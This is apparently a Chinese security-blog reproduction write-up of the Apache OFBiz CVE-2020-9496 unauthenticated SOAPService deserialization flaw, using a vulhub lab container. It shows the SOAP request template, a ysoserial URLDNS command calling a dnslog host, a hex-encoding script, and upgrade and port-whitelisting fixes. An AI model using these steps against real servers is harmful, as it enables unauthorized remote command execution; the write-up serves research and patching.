***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 1、 简介

OFBiz是一个非常著名的[电子商务平台](https://baike.baidu.com/item/%E7%94%B5%E5%AD%90%E5%95%86%E5%8A%A1%E5%B9%B3%E5%8F%B0/3376121)，是一个非常著名的[开源](https://baike.baidu.com/item/%E5%BC%80%E6%BA%90)项目，提供了创建基于最新[J2EE](https://baike.baidu.com/item/J2EE)/[XML](https://baike.baidu.com/item/XML)规范和技术标准，构建大中型企业级、[跨平台](https://baike.baidu.com/item/%E8%B7%A8%E5%B9%B3%E5%8F%B0/8558902)、跨数据库、跨[应用服务器](https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/4971773)的多层、[分布式](https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F/19276232)电子商务类WEB应用系统的框架。
OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的[组件](https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6/6902128)和工具。包括实体引擎,
服务引擎, 消息引擎, [工作流](https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E6%B5%81)引擎,
[规则引擎](https://baike.baidu.com/item/%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/3076955)等。

## 2、 漏洞描述

该两个漏洞允许用户未授权访问SOAPService接口，通过该接口攻击者可以利用ofbiz的反序列化远程命令执行来获得服务器权限。

## 3、 影响范围

Ofbiz：< 17.12.07

## 4、 漏洞环境

该漏洞可以使用vulhub中的CVE-2020-9496容器来进行复现，只需要进入vulhub目录，开启容器即可

<https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/>

docker-compose up -d 开启容器。

开启后访问http://ip:8443/myportal/control/main

## 5、 复现

![1620797070_609b668e44e8dd8c2c3dd.png!small](https://image.3001.net/images/20210512/1620797070_609b668e44e8dd8c2c3dd.png!small)

数据包：

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">
    
    <soapenv:Header/>
    
    <soapenv:Body>
    
    <ser>
    
    <map-Map>
    
    <map-Entry>
    
    <map-Key>
    
    <cus-obj>
    
    [payload]
    
    </cus-obj>
    
    </map-Key>
    
    <map-Value>
    
    <std-String/>
    
    </map-Value>
    
    </map-Entry>
    
    </map-Map>
    
    </ser>
    
    </soapenv:Body>
    
    </soapenv:Envelope>

![1620797086_609b669ebad2ad192155b.png!small](https://image.3001.net/images/20210512/1620797086_609b669ebad2ad192155b.png!small)

该漏洞需要用到工具ysoserial.jar。

git clone <https://github.com/frohoff/ysoserial.git>

漏洞url：

    
    
    /webtools/control/SOAPService
    
    java -jar ysoserial.jar URLDNS http://8o0e9f.dnslog.cn >1.ot

生成1.ot后对其进行hex编码

![1620797099_609b66ab86d45f6869546.png!small](https://image.3001.net/images/20210512/1620797099_609b66ab86d45f6869546.png!small)

python脚本：

    
    
    import binascii
    
    filename = '1.ot'
    
    with open(filename, 'rb') as f:
    
    content = f.read()
    
    print(binascii.hexlify(content))

![1620797112_609b66b84da20f2fa4b2b.png!small](https://image.3001.net/images/20210512/1620797112_609b66b84da20f2fa4b2b.png!small)

将payload复制进请求包中发送。

![1620797123_609b66c37ccf9db050632.png!small](https://image.3001.net/images/20210512/1620797123_609b66c37ccf9db050632.png!small)

![1620797126_609b66c6c97487f99c25a.png!small](https://image.3001.net/images/20210512/1620797126_609b66c6c97487f99c25a.png!small)

## 6、 漏洞防御

可更新至Apache OFBiz最新版。  
下载地址：<https://ofbiz.apache.org/download.html#vulnerabilities>

## 临时修复建议：

若业务环境允许，使用白名单限制web端口的访问来降低风险。

